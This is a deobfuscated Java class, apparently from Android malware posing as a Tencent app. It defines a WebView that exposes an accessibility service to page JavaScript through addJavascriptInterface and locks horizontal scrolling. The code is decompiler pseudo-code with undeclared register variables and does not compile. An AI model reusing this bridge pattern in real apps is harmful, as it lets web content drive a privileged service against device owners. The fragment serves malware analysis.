package com.tencent;

import android.content.*;
import android.view.*;
import android.widget.*;
import android.app.*;
import android.os.*;
import android.accessibilityservice.*;
import android.view.accessibility.*;
import android.telephony.*;
import android.media.*;
import java.util.*;
import java.io.*;
import java.net.*;

/**
 * Deobfuscated class: AccessibilityServiceCore_MyWebView
 * Original: Lcom/tencent/tunesxconcerningn1012$MyWebView;
 */
public class AccessibilityServiceCore_MyWebView extends WebView {

    // === FIELDS ===
    final AccessibilityServiceCore this$0;

    // === METHODS ===

    public void Constructor(AccessibilityServiceCore param0, Context param1) {
        v0.this$0 = v1;
        // new WebView(v2)
        v2 = 0;
        v0.addJavascriptInterface(v1, "Android");
        return;
    }

    protected void onScrollChanged(int param0, int param1, int param2, int param3) {
        v0.onScrollChanged(v1, v2, v3, v4);
        v2 = 0;
        v0.scrollTo(v1, 0);
        return;
    }
}
